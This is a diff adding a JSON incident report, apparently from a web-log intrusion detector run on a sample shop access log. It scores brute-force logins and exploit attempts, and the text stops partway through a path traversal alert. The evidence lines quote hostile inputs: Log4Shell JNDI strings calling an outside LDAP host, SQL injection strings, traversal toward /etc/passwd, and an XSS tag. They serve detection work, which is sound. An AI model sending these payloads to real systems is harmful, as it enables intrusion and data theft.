@@ -1,0 +1,1358 @@
+{
+  "generated_at": "2026-11-26T16:19:10.568031+00:00",
+  "stats": {
+    "lines_read": 3442,
+    "lines_parsed": 3442,
+    "lines_malformed": 0,
+    "events_allowlisted": 0,
+    "unique_clients": 296,
+    "time_start": "2026-11-01T00:00:00+00:00",
+    "time_end": "2026-11-01T05:59:30+00:00",
+    "files": [
+      "examples/hard_access.log"
+    ],
+    "alerts_by_rule": {
+      "BEH-404-BURST": 3,
+      "BEH-BRUTE-FORCE": 5,
+      "BEH-BRUTE-SUCCESS": 4,
+      "BEH-ID-ENUM": 2,
+      "BEH-LOW-AND-SLOW": 6,
+      "SIG-LOG4SHELL": 1,
+      "SIG-SENSITIVE-PATH": 1,
+      "SIG-SQLI": 3,
+      "SIG-TRAVERSAL": 2,
+      "SIG-UA-SCANNER": 3,
+      "SIG-XSS": 1
+    },
+    "incidents_by_severity": {
+      "low": 0,
+      "medium": 7,
+      "high": 3,
+      "critical": 7
+    },
+    "read_errors": [],
+    "network_incidents": 2
+  },
+  "incidents": [
+    {
+      "client_ip": "203.0.113.26",
+      "score": 100,
+      "severity": "critical",
+      "stages": [
+        "credential-access"
+      ],
+      "first_seen": "2026-11-01T00:23:46+00:00",
+      "last_seen": "2026-11-01T00:31:16+00:00",
+      "summary": "203.0.113.26 brute-forced a login (60 failed attempts); the brute force ended in a successful login.",
+      "alerts": [
+        {
+          "rule_id": "BEH-BRUTE-FORCE",
+          "title": "Login brute force",
+          "severity": "high",
+          "client_ip": "203.0.113.26",
+          "first_seen": "2026-11-01T00:23:46+00:00",
+          "last_seen": "2026-11-01T00:31:10+00:00",
+          "event_count": 60,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.26 - - [01/Nov/2026:00:24:23 +0000] \"POST /members/sign-in HTTP/1.1\" 401 333 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:24:32 +0000] \"POST /members/sign-in HTTP/1.1\" 401 339 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:24:41 +0000] \"POST /members/sign-in HTTP/1.1\" 401 333 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:24:48 +0000] \"POST /members/sign-in HTTP/1.1\" 401 316 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:24:57 +0000] \"POST /members/sign-in HTTP/1.1\" 401 310 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+        },
+        {
+          "rule_id": "BEH-BRUTE-SUCCESS",
+          "title": "Successful login after brute force",
+          "severity": "critical",
+          "client_ip": "203.0.113.26",
+          "first_seen": "2026-11-01T00:26:17+00:00",
+          "last_seen": "2026-11-01T00:31:16+00:00",
+          "event_count": 61,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.26 - - [01/Nov/2026:00:30:49 +0000] \"POST /members/sign-in HTTP/1.1\" 401 318 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:30:57 +0000] \"POST /members/sign-in HTTP/1.1\" 401 317 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:31:04 +0000] \"POST /members/sign-in HTTP/1.1\" 401 340 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:31:10 +0000] \"POST /members/sign-in HTTP/1.1\" 401 334 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.26 - - [01/Nov/2026:00:31:16 +0000] \"POST /members/sign-in HTTP/1.1\" 302 0 \"https://shop.example.com/members/sign-in\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "Login succeeded (HTTP 302) after 60 failed attempts (401/403); credentials may be compromised."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.23",
+      "score": 100,
+      "severity": "critical",
+      "stages": [
+        "credential-access"
+      ],
+      "first_seen": "2026-11-01T00:26:56+00:00",
+      "last_seen": "2026-11-01T00:47:11+00:00",
+      "summary": "203.0.113.23 brute-forced a login (40 failed attempts); the brute force ended in a successful login.",
+      "alerts": [
+        {
+          "rule_id": "BEH-BRUTE-FORCE",
+          "title": "Login brute force",
+          "severity": "high",
+          "client_ip": "203.0.113.23",
+          "first_seen": "2026-11-01T00:26:56+00:00",
+          "last_seen": "2026-11-01T00:46:39+00:00",
+          "event_count": 40,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.23 - - [01/Nov/2026:00:29:30 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:30:01 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:30:29 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:31:00 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:31:28 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+        },
+        {
+          "rule_id": "BEH-BRUTE-SUCCESS",
+          "title": "Successful login after brute force",
+          "severity": "critical",
+          "client_ip": "203.0.113.23",
+          "first_seen": "2026-11-01T00:42:36+00:00",
+          "last_seen": "2026-11-01T00:47:11+00:00",
+          "event_count": 41,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.23 - - [01/Nov/2026:00:45:08 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:45:38 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:46:10 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:46:39 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.23 - - [01/Nov/2026:00:47:11 +0000] \"POST /login HTTP/1.1\" 302 0 \"https://shop.example.com/login\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.15",
+      "score": 100,
+      "severity": "critical",
+      "stages": [
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T02:02:12+00:00",
+      "last_seen": "2026-11-01T02:02:19+00:00",
+      "summary": "203.0.113.15 sent a Log4Shell (JNDI lookup) payload; one attempt returned 2xx.",
+      "alerts": [
+        {
+          "rule_id": "SIG-LOG4SHELL",
+          "title": "Log4Shell JNDI injection (CVE-2021-44228)",
+          "severity": "critical",
+          "client_ip": "203.0.113.15",
+          "first_seen": "2026-11-01T02:02:12+00:00",
+          "last_seen": "2026-11-01T02:02:19+00:00",
+          "event_count": 3,
+          "technique": "T1190",
+          "evidence": [
+            "203.0.113.15 - - [01/Nov/2026:02:02:12 +0000] \"GET / HTTP/1.1\" 200 14531 \"-\" \"${jndi:ldap://203.0.113.99/a}\"",
+            "203.0.113.15 - - [01/Nov/2026:02:02:15 +0000] \"GET /login HTTP/1.1\" 200 262 \"${jndi:ldap://203.0.113.99/b}\" \"${jndi:ldap://203.0.113.99/a}\"",
+            "203.0.113.15 - - [01/Nov/2026:02:02:19 +0000] \"GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fc%7D HTTP/1.1\" 200 10117 \"-\" \"curl/8.5.0\""
+          ],
+          "detail": "3 matching request(s); patterns: jndi-lookup. 1 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical. answered 2xx, but / answers 2xx to ordinary requests (204 baseline, size ~12682 bytes), so not treated as success."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.14",
+      "score": 100,
+      "severity": "critical",
+      "stages": [
+        "recon",
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T02:55:51+00:00",
+      "last_seen": "2026-11-01T02:57:55+00:00",
+      "summary": "203.0.113.14 ran a sqlmap scan, then attempted SQL injection; 12 attempts returned 200.",
+      "alerts": [
+        {
+          "rule_id": "SIG-UA-SCANNER",
+          "title": "Known scanner user agent",
+          "severity": "medium",
+          "client_ip": "203.0.113.14",
+          "first_seen": "2026-11-01T02:55:51+00:00",
+          "last_seen": "2026-11-01T02:57:55+00:00",
+          "event_count": 40,
+          "technique": "T1595.002",
+          "evidence": [
+            "203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] \"GET /products?id=1'+OR+'1'='1 HTTP/1.1\" 500 225 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] \"GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1\" 200 6006 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] \"GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1\" 200 716 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] \"GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1\" 200 14618 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] \"GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1\" 500 382 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\""
+          ],
+          "detail": "40 matching request(s); patterns: scanner-ua."
+        },
+        {
+          "rule_id": "SIG-SQLI",
+          "title": "SQL injection pattern",
+          "severity": "critical",
+          "client_ip": "203.0.113.14",
+          "first_seen": "2026-11-01T02:55:51+00:00",
+          "last_seen": "2026-11-01T02:57:55+00:00",
+          "event_count": 40,
+          "technique": "T1190",
+          "evidence": [
+            "203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] \"GET /products?id=1'+OR+'1'='1 HTTP/1.1\" 500 225 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] \"GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1\" 200 6006 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] \"GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1\" 200 716 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] \"GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1\" 200 14618 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\"",
+            "203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] \"GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1\" 500 382 \"-\" \"sqlmap/1.8#stable (https://sqlmap.org)\""
+          ],
+          "detail": "40 matching request(s); patterns: tautology, quote-or-cmp, union-select, select-fn, quote-comment, time-based, numeric-compare, sql-variable. 12 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.13",
+      "score": 100,
+      "severity": "critical",
+      "stages": [
+        "credential-access"
+      ],
+      "first_seen": "2026-11-01T03:35:51+00:00",
+      "last_seen": "2026-11-01T03:39:41+00:00",
+      "summary": "203.0.113.13 brute-forced a login (40 failed attempts); the brute force ended in a successful login.",
+      "alerts": [
+        {
+          "rule_id": "BEH-BRUTE-FORCE",
+          "title": "Login brute force",
+          "severity": "high",
+          "client_ip": "203.0.113.13",
+          "first_seen": "2026-11-01T03:35:51+00:00",
+          "last_seen": "2026-11-01T03:39:34+00:00",
+          "event_count": 40,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.13 - - [01/Nov/2026:03:36:22 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:36:26 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:36:34 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:36:40 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:36:48 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\""
+          ],
+          "detail": "10 login POSTs within 300s (threshold 10); 10 explicit 401/403 failures."
+        },
+        {
+          "rule_id": "BEH-BRUTE-SUCCESS",
+          "title": "Successful login after brute force",
+          "severity": "critical",
+          "client_ip": "203.0.113.13",
+          "first_seen": "2026-11-01T03:35:51+00:00",
+          "last_seen": "2026-11-01T03:39:41+00:00",
+          "event_count": 41,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.13 - - [01/Nov/2026:03:39:17 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:39:24 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:39:31 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:39:34 +0000] \"POST /login HTTP/1.1\" 401 512 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"",
+            "203.0.113.13 - - [01/Nov/2026:03:39:41 +0000] \"POST /login HTTP/1.1\" 302 0 \"https://shop.example.com/login\" \"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\""
+          ],
+          "detail": "Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.24",
+      "score": 85,
+      "severity": "critical",
+      "stages": [
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T04:38:13+00:00",
+      "last_seen": "2026-11-01T04:40:22+00:00",
+      "summary": "203.0.113.24 attempted SQL injection; five attempts returned 200.",
+      "alerts": [
+        {
+          "rule_id": "SIG-SQLI",
+          "title": "SQL injection pattern",
+          "severity": "critical",
+          "client_ip": "203.0.113.24",
+          "first_seen": "2026-11-01T04:38:13+00:00",
+          "last_seen": "2026-11-01T04:40:22+00:00",
+          "event_count": 5,
+          "technique": "T1190",
+          "evidence": [
+            "203.0.113.24 - - [01/Nov/2026:04:38:13 +0000] \"GET /products?id=1%20AND%201=CONVERT(int,@@version) HTTP/1.1\" 200 14305 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.24 - - [01/Nov/2026:04:38:50 +0000] \"GET /products?sort=name%20ORDER%20BY%2010-- HTTP/1.1\" 200 20624 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.24 - - [01/Nov/2026:04:39:28 +0000] \"GET /products?id=1+AND+1=2-- HTTP/1.1\" 200 23299 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.24 - - [01/Nov/2026:04:39:54 +0000] \"GET /products?id=1%20AND%201=1 HTTP/1.1\" 200 5043 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
+            "203.0.113.24 - - [01/Nov/2026:04:40:22 +0000] \"GET /products?id=1%27%20AND%20%271%27=%272 HTTP/1.1\" 200 8206 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\""
+          ],
+          "detail": "5 matching request(s); patterns: sql-variable, order-by, numeric-compare, tautology, quote-or-cmp. 5 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.27",
+      "score": 80,
+      "severity": "critical",
+      "stages": [
+        "credential-access"
+      ],
+      "first_seen": "2026-11-01T00:52:22+00:00",
+      "last_seen": "2026-11-01T00:58:20+00:00",
+      "summary": "203.0.113.27 brute-forced a login (81 login attempts); the brute force ended in a successful login.",
+      "alerts": [
+        {
+          "rule_id": "BEH-BRUTE-FORCE",
+          "title": "Login brute force",
+          "severity": "medium",
+          "client_ip": "203.0.113.27",
+          "first_seen": "2026-11-01T00:52:22+00:00",
+          "last_seen": "2026-11-01T00:58:20+00:00",
+          "event_count": 81,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.27 - - [01/Nov/2026:00:52:45 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5\"",
+            "203.0.113.27 - - [01/Nov/2026:00:52:51 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\"",
+            "203.0.113.27 - - [01/Nov/2026:00:52:54 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1\"",
+            "203.0.113.27 - - [01/Nov/2026:00:52:58 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 Build/2\"",
+            "203.0.113.27 - - [01/Nov/2026:00:53:02 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1 Build/3\""
+          ],
+          "detail": "10 login POSTs within 300s (threshold 10); 0 explicit 401/403 failures; status-agnostic; lower confidence; user agent rotated across 6 values."
+        },
+        {
+          "rule_id": "BEH-BRUTE-SUCCESS",
+          "title": "Successful login after brute force",
+          "severity": "high",
+          "client_ip": "203.0.113.27",
+          "first_seen": "2026-11-01T00:53:20+00:00",
+          "last_seen": "2026-11-01T00:58:20+00:00",
+          "event_count": 68,
+          "technique": "T1110",
+          "evidence": [
+            "203.0.113.27 - - [01/Nov/2026:00:58:01 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 Build/4\"",
+            "203.0.113.27 - - [01/Nov/2026:00:58:06 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5\"",
+            "203.0.113.27 - - [01/Nov/2026:00:58:11 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\"",
+            "203.0.113.27 - - [01/Nov/2026:00:58:15 +0000] \"POST /oauth2/token HTTP/1.1\" 200 37 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1\"",
+            "203.0.113.27 - - [01/Nov/2026:00:58:20 +0000] \"POST /oauth2/token HTTP/1.1\" 200 412 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0\""
+          ],
+          "detail": "response size changed from ~37 to 412 bytes after 67 uniform answers; likely success."
+        }
+      ]
+    },
+    {
+      "client_ip": "198.51.100.251",
+      "score": 65,
+      "severity": "high",
+      "stages": [
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T01:59:53+00:00",
+      "last_seen": "2026-11-01T02:02:47+00:00",
+      "summary": "198.51.100.251 attempted cross-site scripting, then attempted SQL injection.",
+      "alerts": [
+        {
+          "rule_id": "SIG-XSS",
+          "title": "Script injection (XSS) pattern",
+          "severity": "medium",
+          "client_ip": "198.51.100.251",
+          "first_seen": "2026-11-01T01:59:53+00:00",
+          "last_seen": "2026-11-01T01:59:53+00:00",
+          "event_count": 1,
+          "technique": "T1190",
+          "evidence": [
+            "198.51.100.251 - - [01/Nov/2026:01:59:53 +0000] \"GET /docs/search?q=%3Cscript+src%3D%22app.js%22%3E HTTP/1.1\" 200 3061 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\""
+          ],
+          "detail": "1 matching request(s); patterns: script-tag. answered 2xx, but /docs/search answers 2xx to ordinary requests (18 baseline, size ~4465 bytes), so not treated as success."
+        },
+        {
+          "rule_id": "SIG-SQLI",
+          "title": "SQL injection pattern",
+          "severity": "high",
+          "client_ip": "198.51.100.251",
+          "first_seen": "2026-11-01T02:01:10+00:00",
+          "last_seen": "2026-11-01T02:02:47+00:00",
+          "event_count": 2,
+          "technique": "T1190",
+          "evidence": [
+            "198.51.100.251 - - [01/Nov/2026:02:01:10 +0000] \"GET /docs/search?q=%27+OR+1%3D1+explained HTTP/1.1\" 200 3669 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\"",
+            "198.51.100.251 - - [01/Nov/2026:02:02:47 +0000] \"GET /docs/search?q=UNION+SELECT+explained HTTP/1.1\" 200 5614 \"https://shop.example.com/docs/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0\""
+          ],
+          "detail": "2 matching request(s); patterns: tautology, numeric-compare, quote-or-cmp, union-select. answered 2xx, but /docs/search answers 2xx to ordinary requests (18 baseline, size ~4465 bytes), so not treated as success."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.16",
+      "score": 60,
+      "severity": "high",
+      "stages": [
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T01:45:20+00:00",
+      "last_seen": "2026-11-01T01:45:58+00:00",
+      "summary": "203.0.113.16 attempted path traversal.",
+      "alerts": [
+        {
+          "rule_id": "SIG-TRAVERSAL",
+          "title": "Path traversal pattern",
+          "severity": "high",
+          "client_ip": "203.0.113.16",
+          "first_seen": "2026-11-01T01:45:20+00:00",
+          "last_seen": "2026-11-01T01:45:58+00:00",
+          "event_count": 7,
+          "technique": "T1190",
+          "evidence": [
+            "203.0.113.16 - - [01/Nov/2026:01:45:20 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 432 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.16 - - [01/Nov/2026:01:45:30 +0000] \"GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 404 438 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.16 - - [01/Nov/2026:01:45:34 +0000] \"GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\" 404 547 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.16 - - [01/Nov/2026:01:45:38 +0000] \"GET /download?file=....//....//....//etc/passwd HTTP/1.1\" 403 494 \"-\" \"python-requests/2.31.0\"",
+            "203.0.113.16 - - [01/Nov/2026:01:45:41 +0000] \"GET /view?page=..\\..\\..\\windows\\win.ini HTTP/1.1\" 404 372 \"-\" \"python-requests/2.31.0\""
+          ],
+          "detail": "7 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd, nested-dotdot, win-ini."
+        }
+      ]
+    },
+    {
+      "client_ip": "203.0.113.25",
+      "score": 60,
+      "severity": "high",
+      "stages": [
+        "exploit"
+      ],
+      "first_seen": "2026-11-01T04:44:35+00:00",
+      "last_seen": "2026-11-01T04:45:45+00:00",
+      "summary": "203.0.113.25 attempted path traversal.",
+      "alerts": [
+        {
+          "rule_id": "SIG-TRAVERSAL",
+          "title": "Path traversal pattern",
+          "severity": "high",
+          "client_ip": "203.0.113.25",
+          "first_seen": "2026-11-01T04:44:35+00:00",
+          "last_seen": "2026-11-01T04:45:45+00:00",
+          "event_count": 4,
+          "technique": "T1190",
+          "evidence": [
+            "203.0.113.25 - - [01/Nov/2026:04:44:35 +0000] \"GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1\" 404 234 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\"",
